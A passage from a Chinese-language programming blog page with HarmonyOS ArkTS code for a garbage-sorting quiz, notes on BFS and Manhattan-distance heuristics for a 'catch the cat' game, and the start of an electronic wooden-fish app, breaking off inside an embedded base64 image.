function_">height</span>(<span class="string">&#x27;130lpx&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">          .<span class="title function_">border</span>(&#123; <span class="attr">width</span>: <span class="number">1</span> &#125;) <span class="comment">// 设置边框宽度</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角半径</span></span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;20lpx&#x27;</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">2</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">scale</span>(<span class="variable language_">this</span>.<span class="property">scaleOptions</span>); <span class="comment">// 设置缩放比例</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">showAnimation</span>) &#123; <span class="comment">// 如果显示动画</span></span><br><span class="line">          <span class="title class_">Particle</span>(&#123; <span class="comment">// 创建粒子效果</span></span><br><span class="line">            <span class="attr">particles</span>: [ <span class="comment">// 初始化粒子数组</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">emitter</span>: &#123; <span class="comment">// 粒子发射器配置</span></span><br><span class="line">                  <span class="attr">particle</span>: &#123; <span class="comment">// 粒子类型配置</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleType</span>.<span class="property">POINT</span>, <span class="comment">// 粒子类型为点</span></span><br><span class="line">                    <span class="attr">config</span>: &#123; <span class="comment">// 配置</span></span><br><span class="line">                      <span class="attr">radius</span>: <span class="number">5</span> <span class="comment">// 点的半径</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">count</span>: <span class="number">50</span>, <span class="comment">// 粒子数量</span></span><br><span class="line">                    <span class="attr">lifetime</span>: -<span class="number">1</span>, <span class="comment">// 生命周期</span></span><br><span class="line">                    <span class="attr">lifetimeRange</span>: -<span class="number">1</span> <span class="comment">// 生命周期范围</span></span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="attr">emitRate</span>: <span class="number">100</span>, <span class="comment">// 发射速率</span></span><br><span class="line">                  <span class="attr">position</span>: [<span class="string">&#x27;25%&#x27;</span>, <span class="number">0</span>], <span class="comment">// 发射位置</span></span><br><span class="line">                  <span class="attr">size</span>: [<span class="string">&#x27;100lpx&#x27;</span>, <span class="string">&#x27;100lpx&#x27;</span>], <span class="comment">// 发射器大小</span></span><br><span class="line">                  <span class="attr">shape</span>: <span class="title class_">ParticleEmitterShape</span>.<span class="property">RECTANGLE</span> <span class="comment">// 发射器形状为矩形</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">color</span>: &#123; <span class="comment">// 粒子颜色配置</span></span><br><span class="line">                  <span class="attr">range</span>: [<span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="title class_">Color</span>.<span class="property">Orange</span>], <span class="comment">// 颜色范围</span></span><br><span class="line">                  <span class="attr">updater</span>: &#123; <span class="comment">// 更新器配置</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">CURVE</span>, <span class="comment">// 变化方式为曲线变化</span></span><br><span class="line">                    <span class="attr">config</span>: [ <span class="comment">// 配置项</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">from</span>: <span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="comment">// 起始颜色</span></span><br><span class="line">                        <span class="attr">to</span>: <span class="title class_">Color</span>.<span class="property">Orange</span>, <span class="comment">// 终止颜色</span></span><br><span class="line">                        <span class="attr">startMillis</span>: <span class="number">0</span>, <span class="comment">// 开始时间</span></span><br><span class="line">                        <span class="attr">endMillis</span>: -<span class="number">1</span>, <span class="comment">// 结束时间</span></span><br><span class="line">                        <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">FastOutLinearIn</span> <span class="comment">// 曲线类型</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ]</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">scale</span>: &#123; <span class="comment">// 粒子大小配置</span></span><br><span class="line">                  <span class="attr">range</span>: [<span class="number">0.8</span>, <span class="number">1.2</span>], <span class="comment">// 大小范围</span></span><br><span class="line">                  <span class="attr">updater</span>: &#123; <span class="comment">// 更新器配置</span></span><br><span class="line">                    <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">CURVE</span>, <span class="comment">// 变化方式为曲线变化</span></span><br><span class="line">                    <span class="attr">config</span>: [ <span class="comment">// 配置项</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="attr">from</span>: <span class="number">1.0</span>, <span class="comment">// 起始大小</span></span><br><span class="line">                        <span class="attr">to</span>: <span class="number">1.0</span>, <span class="comment">// 终止大小</span></span><br><span class="line">                        <span class="attr">startMillis</span>: <span class="number">0</span>, <span class="comment">// 开始时间</span></span><br><span class="line">                        <span class="attr">endMillis</span>: -<span class="number">1</span>, <span class="comment">// 结束时间</span></span><br><span class="line">                        <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseIn</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ]</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 粒子加速度配置</span></span><br><span class="line">                <span class="attr">acceleration</span>: &#123;</span><br><span class="line">                  <span class="attr">speed</span>: &#123;</span><br><span class="line">                    <span class="attr">range</span>: [<span class="number">8000</span>, <span class="number">10000</span>], <span class="comment">// 向下减速，模拟重力</span></span><br><span class="line">                    <span class="attr">updater</span>: &#123;</span><br><span class="line">                      <span class="attr">type</span>: <span class="title class_">ParticleUpdater</span>.<span class="property">RANDOM</span>, <span class="comment">// 加速度线性变化</span></span><br><span class="line">                      <span class="attr">config</span>: [<span class="number">400</span>, <span class="number">500</span>]</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="attr">angle</span>: &#123;</span><br><span class="line">                    <span class="attr">range</span>: [<span class="number">90</span>, <span class="number">90</span>] <span class="comment">// 方向固定向下</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&quot;100%&quot;</span>).<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;150lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>)</span><br><span class="line">      .<span class="title function_">translate</span>(&#123;<span class="attr">x</span>:<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.itemXPosition&#125;</span>lpx`</span>,<span class="attr">y</span>:<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">garbageCategories</span>, <span class="function">(<span class="params">category: GarbageCategory</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Column</span>() &#123;</span><br><span class="line">            <span class="title class_">Text</span>(category.<span class="property">name</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">&#x27;30lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">5</span>);</span><br><span class="line">            <span class="title class_">Divider</span>();</span><br><span class="line">            <span class="title class_">Text</span>(category.<span class="property">description</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">&#x27;28lpx&#x27;</span>)</span><br><span class="line">              .<span class="title function_">padding</span>(<span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(category.<span class="property">color</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;280lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&quot;24%&quot;</span>)</span><br><span class="line">          .<span class="title function_">border</span>(&#123; <span class="attr">width</span>: <span class="number">1</span> &#125;)</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="number">1</span>, <span class="attr">right</span>: <span class="number">1</span> &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">scale</span>: <span class="number">0.8</span>, <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">MIDDLE</span> &#125;)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">showAnimation</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">showAnimation</span> = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">let</span> <span class="attr">itemX</span>:number = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">0</span>)&#123;</span><br><span class="line">              itemX = -<span class="number">270</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">1</span>)&#123;</span><br><span class="line">              itemX = -<span class="number">90</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">2</span>)&#123;</span><br><span class="line">              itemX = <span class="number">90</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">3</span>)&#123;</span><br><span class="line">              itemX = <span class="number">270</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">              <span class="attr">duration</span>:<span class="number">200</span>,</span><br><span class="line">              <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                  <span class="attr">duration</span>:<span class="number">800</span>,</span><br><span class="line">                  <span class="attr">curve</span>: curves.<span class="title function_">springCurve</span>(<span class="number">0</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">20</span>),</span><br><span class="line">                  <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                      <span class="attr">duration</span>:<span class="number">200</span>,</span><br><span class="line">                      <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = <span class="number">0</span></span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">checkAnswer</span>(category.<span class="property">type</span>);</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">showAnimation</span> = <span class="literal">false</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                      <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = <span class="number">0</span></span><br><span class="line">                      <span class="variable language_">this</span>.<span class="property">scaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1.0</span>, <span class="attr">y</span>: <span class="number">1.0</span> &#125;;</span><br><span class="line">                    &#125;)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">scaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1.3</span>, <span class="attr">y</span>: <span class="number">1.3</span> &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = itemX</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>).<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> &#125;).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>()</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="catch-cat"><a href="#catch-cat" class="headerlink" title="catch cat"></a>catch cat</h1><p>围住神经猫</p><h1 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h1><h2 id="1-广度优先搜索（BFS）："><a href="#1-广度优先搜索（BFS）：" class="headerlink" title="1. 广度优先搜索（BFS）："></a>1. 广度优先搜索（BFS）：</h2><p>广度优先搜索（Breadth-First Search，简称 BFS）是一种用于图和树结构的遍历或搜索算法。它从一个起始节点开始，首先访问该节点的所有邻接节点，然后再以同样的方式逐层访问这些邻接节点的邻接节点，直到访问完整个图或者找到目标节点为止。BFS的特点是按照从近到远的顺序访问节点，因此它非常适合用来寻找最短路径问题，尤其是在所有边的权重相等的情况下。</p><p>BFS的基本步骤如下：<br>初始化：选择一个起始节点，将其放入队列，并标记为已访问。<br>循环处理：<br>从队列中取出第一个节点。<br>检查该节点是否为目标节点；如果是，则结束搜索。<br>否则，将该节点的所有未访问过的邻接节点加入队列，并标记为已访问。<br>终止条件：当队列为空时，表示所有可到达的节点都已经被访问过，如果此时还没有找到目标节点，则说明目标节点不可达。</p><p>在 findNeighbors 方法中，通过遍历当前单元格的邻居来获取周围非墙壁且可以移动的单元格集合。这类似于广度优先搜索的思想，逐层遍历邻居单元格。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">findNeighbors</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): <span class="title class_">Cell</span>[] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">neighbors</span>: <span class="title class_">Cell</span>[] = [];</span><br><span class="line">    <span class="comment">// 检查当前单元格的六个方向邻居，将非墙壁且可以移动的单元格加入集合</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> neighbors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-启发式搜索："><a href="#2-启发式搜索：" class="headerlink" title="2. 启发式搜索："></a>2. 启发式搜索：</h2><p>在 selectNextMove 方法中，根据一定的启发式函数选择下一个移动位置，以确保小猫朝着离边界最近的方向移动。这种启发式搜索可以帮助小猫更智能地选择下一步的移动位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">selectNextMove</span>(<span class="attr">emptyNeighbors</span>: <span class="title class_">Cell</span>[]): <span class="title class_">Cell</span> &#123;</span><br><span class="line">    <span class="comment">// 根据启发式函数选择最优的移动位置</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> closestToEdge || emptyNeighbors[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-曼哈顿距离计算："><a href="#3-曼哈顿距离计算：" class="headerlink" title="3. 曼哈顿距离计算："></a>3. 曼哈顿距离计算：</h2><p>曼哈顿距离（Manhattan Distance），也称为城市街区距离（City Block distance）或出租车几何，是衡量在标准坐标系中两个点之间沿轴向距离的总和。简单来说，它是从一个点到另一个点，在只允许水平或垂直移动的情况下，必须经过的最小距离。这个概念得名于美国纽约市曼哈顿区的街道布局，因为那里的街道大多呈网格状分布，车辆只能沿着这些街道行驶，而不能斜穿。</p><p>在 computeHeuristic 方法中，使用曼哈顿距离计算启发式函数的值，以评估当前单元格到边界的距离。曼哈顿距离是在网格上两点之间的距离，沿着网格的边缘移动。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">computeHeuristic</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): number &#123;</span><br><span class="line">    <span class="comment">// 计算曼哈顿距离作为启发式函数的值</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> minDistanceX + minDistanceY;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="wood-fish"><a href="#wood-fish" class="headerlink" title="wood fish"></a>wood fish</h1><p>电子木鱼</p><p>animateToImmediately </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 观察者模式装饰器</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="attr">value</span>: string = <span class="string">&#x27;功德+1&#x27;</span>; <span class="comment">// 默认显示的文字</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// 跟踪属性变化</span></span><br><span class="line">  <span class="attr">opacity</span>: number = <span class="number">0</span>; <span class="comment">// 文字透明度</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// 跟踪属性变化</span></span><br><span class="line">  <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// 文字的垂直偏移量</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 主入口组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">list</span>: <span class="title class_">Cell</span>[] = []; <span class="comment">// 存储所有 Cell 对象的数组</span></span><br><span class="line">  <span class="attr">indexCount</span>: number = <span class="number">0</span>; <span class="comment">// 记录当前滚动的索引</span></span><br><span class="line">  <span class="attr">count</span>: number = <span class="number">10</span>; <span class="comment">// 列表中 Cell 对象的数量</span></span><br><span class="line">  <span class="attr">image</span>: string =</span><br><span class="line">    <span class="string">&#x27;data:image/png;base64,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